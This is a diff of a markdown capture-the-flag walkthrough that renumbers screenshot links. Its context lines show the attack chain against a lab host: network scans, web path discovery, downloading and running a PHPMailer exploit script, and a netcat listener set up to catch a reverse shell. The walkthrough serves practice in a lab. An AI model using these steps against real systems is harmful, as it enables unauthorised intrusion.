@@ -32,31 +32,31 @@ Tools:
 
         ifconfig
 
-    ![1](/Images/4/111.PNG)
+    ![1](/Images/4/1.PNG)
 
 2. Network FootPrinting (find machines on the network)
 
         nmap 192.168.1.0/24
 
-    ![2](/Images/4/222.PNG)
+    ![2](/Images/4/2.PNG)
 
 3. Target 2 fingerprinting (find services and ports on target) 
 
         nmap -sV 192.168.1.115 
 
-    ![3](/Images/4/333.PNG)
+    ![3](/Images/4/3.PNG)
 
 4.  Look for Webserver vulnerabilities using Nikto
 
         nikto -C all -h 192.168.1.115
 
-    ![2](/Images/4/2.PNG)
+    ![4](/Images/4/4.PNG)
 
 5. Scan for paths in the webserver using Gobuster.
 
         gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115
 
-    ![3](/Images/4/3.PNG)
+    ![5](/Images/4/5.PNG)
 
 6. Explore path `192.168.1.115/vendor/` using the browser 
    
@@ -64,31 +64,31 @@ Tools:
 
     **PHPMAILER detected**
 
-    ![4](/Images/4/4.PNG)     
+    ![6](/Images/4/6.PNG)     
    
 7. Double click "PATH"
 
     **Flag1**
 
-    ![5](/Images/4/5.PNG)
+    ![7](/Images/4/7.PNG)
 
 8. Double "Click SECURITY.md"
 
     **It reveals vulnerable versions of PHPMAILER.**
 
-    ![6](/Images/4/6.PNG)    
+    ![8](/Images/4/8.PNG)    
 
 9.  Double "Click VERSION" 
 
     **It reveals the PHPMAILER version in use**
 
-    ![7](/Images/4/7.PNG)  
+    ![9](/Images/4/9.PNG)  
 
 10. Look for scripts to exploit PHPMAILER with Searchsploit
 
         searchsploit phpmailer
 
-    ![8](/Images/4/8.PNG)  
+    ![10](/Images/4/10.PNG)  
 
 11. Look at the Bash Script to exploit  PHPMAILER
 
@@ -96,13 +96,13 @@ Tools:
 
     **press "q" keyboard to quit view**
 
-    ![9](/Images/4/9.PNG) 
+    ![11](/Images/4/11.PNG) 
 
 12. Download the script to the current folder
 
         searchsploit phpmailer -m php/webapps/40968.sh
 
-    ![10](/Images/4/10.PNG)
+    ![12](/Images/4/12.PNG)
 
 13. Authorize file to execute
 
@@ -112,7 +112,7 @@ Tools:
 
         ./40968.sh 192.168.1.115
 
-    ![11](/Images/4/11.PNG)
+    ![13](/Images/4/13.PNG)
 
     > Note: Now we know the PHPMAILER can be exploited, but the shell from this script does not allow to do much. We can find and use a more useful script that allows to create a more powerfull shell.
 
@@ -124,7 +124,7 @@ Tools:
 
     **Use "CTRL X", then "y", and "enter" (to exit nano)**
 
-    ![12](/Images/4/12.PNG)
+    ![14](/Images/4/14.PNG)
 
 16. Authorize file to execute
 
@@ -134,13 +134,13 @@ Tools:
 
         ./exploit.sh
 
-    ![13](/Images/4/13.PNG)
+    ![15](/Images/4/15.PNG)
 
 18. Set netcat to lisent on kali machine
 
          nc -lnvp 4444
 
-    ![14](/Images/4/14.PNG)
+    ![16](/Images/4/16.PNG)
 
 19. Make exploited machine calls Kali Linux machine with a netcat command embedded in the next payload after running it in the browser.
 
@@ -148,13 +148,13 @@ Tools:
 
     **Change the second IP address for the one of your own kali linux machine.**
 
-    ![16](/Images/4/16.PNG)
+    ![17](/Images/4/17.PNG)
 
 21. Look for flags with find command
 
         find /var/www -type f -iname 'flag*'
 
-    ![17](/Images/4/17.PNG)
+    ![18](/Images/4/18.PNG)
 
 22. Open file
 
@@ -162,7 +162,7 @@ Tools:
 
     **flag2**
 
-    ![18](/Images/4/18.PNG)
+    ![19](/Images/4/19.PNG)
 
 23. Look for others flags
 
@@ -170,11 +170,11 @@ Tools:
 
     **The "./" previous "wordpress" means the file is active on wordpress.**
 
-    ![19](/Images/4/19.PNG)
+    ![20](/Images/4/20.PNG)
 
 24. Inset paths on the browser
 
         http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
 
     **flag3**
-   ![20](/Images/4/20.PNG)
+   ![21](/Images/4/21.PNG)
